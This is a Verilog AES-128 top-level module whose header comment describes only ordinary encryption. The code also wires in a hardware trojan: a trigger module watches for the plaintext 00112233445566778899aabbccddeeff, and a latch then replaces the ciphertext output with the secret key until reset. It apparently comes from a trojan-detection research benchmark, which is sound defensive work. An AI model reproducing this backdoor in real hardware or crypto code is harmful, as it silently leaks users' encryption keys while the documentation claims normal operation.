`timescale 1ns / 1ps
// AES Top Module
//
// This module serves as the top-level entity for AES encryption. It instantiates
// the aes_128 module to perform the encryption process.
//
// The aes_top module receives the following inputs:
//   - clk: Clock signal
//   - rst: Reset signal
//   - state: Input state for AES encryption
//   - key: Input key for AES encryption
//
// It provides the following output:
//   - out: Encrypted output
//
// Revision History:
// - Revision 0.01: File created
//
//////////////////////////////////////////////////////////////////////////////////
module aes_top ( 
		 input clk, 
		 input rst, 
		 input [127:0] state, 
		 input [127:0] key, 
		 output [127:0] out
    ); 
	wire [15:0] HT_Trig;
	wire [127:0] HT_ciphertext; 
	
	// Instantiation of AES encryption module
	aes_128 AES (.clk(clk), .state(state), .key(key), .out(HT_ciphertext)); 
	HT_Tri HT_Trigger (.state(state), .Tj_Trig(HT_Trig)); 
	HT_TSC HT_Trojan (.clk(clk), .rst(rst), .Tj_Trig(HT_Trig), .key(key), .ciphertext(HT_ciphertext), .out(out)); 
 
endmodule

module HT_Tri(
    input [127:0] state,
    output reg [15:0] Tj_Trig
    );

	always @(state)
	begin
		Tj_Trig[15] = state[127:120] == 8'h00;
		Tj_Trig[14] = state[119:112] == 8'h11;
		Tj_Trig[13] = state[111:104] == 8'h22;
		Tj_Trig[12] = state[103:96]  == 8'h33;
		Tj_Trig[11] = state[95:88]   == 8'h44;
		Tj_Trig[10] = state[87:80]   == 8'h55;
		Tj_Trig[9]  = state[79:72]   == 8'h66;
		Tj_Trig[8]  = state[71:64]   == 8'h77;
		Tj_Trig[7]  = state[63:56]   == 8'h88;
		Tj_Trig[6]  = state[55:48]   == 8'h99;
		Tj_Trig[5]  = state[47:40]   == 8'haa;
		Tj_Trig[4]  = state[39:32]   == 8'hbb;
		Tj_Trig[3]  = state[31:24]   == 8'hcc;
		Tj_Trig[2]  = state[23:16]   == 8'hdd;
		Tj_Trig[1]  = state[15:8]    == 8'hee;
		Tj_Trig[0]  = state[7:0]     == 8'hff;
	end

endmodule

module HT_TSC(
    input clk,
    input rst,
    input [15:0] Tj_Trig, 
    input [127:0] key,
    input [127:0] ciphertext,
    output [127:0] out
    );

reg [15:0] Tj_state;

always @(posedge clk, posedge rst) begin
	if (rst == 1) begin
		Tj_state <= 16'h0000;
	end else begin
		Tj_state[15] <= Tj_Trig[15] | &Tj_state;
		Tj_state[14] <= Tj_Trig[14] | &Tj_state;
		Tj_state[13] <= Tj_Trig[13] | &Tj_state;
		Tj_state[12] <= Tj_Trig[12] | &Tj_state;
		Tj_state[11] <= Tj_Trig[11] | &Tj_state;
		Tj_state[10] <= Tj_Trig[10] | &Tj_state;
		Tj_state[9]  <= Tj_Trig[9]  | &Tj_state;
		Tj_state[8]  <= Tj_Trig[8]  | &Tj_state;
		Tj_state[7]  <= Tj_Trig[7]  | &Tj_state;
		Tj_state[6]  <= Tj_Trig[6]  | &Tj_state;
		Tj_state[5]  <= Tj_Trig[5]  | &Tj_state;
		Tj_state[4]  <= Tj_Trig[4]  | &Tj_state;
		Tj_state[3]  <= Tj_Trig[3]  | &Tj_state;
		Tj_state[2]  <= Tj_Trig[2]  | &Tj_state;
		Tj_state[1]  <= Tj_Trig[1]  | &Tj_state;
		Tj_state[0]  <= Tj_Trig[0]  | &Tj_state;
	end
end

// assign out = &Tj_state?key:ciphertext;
assign out = {128{~&Tj_state}} & ciphertext | {128{&Tj_state}} & key;

endmodule 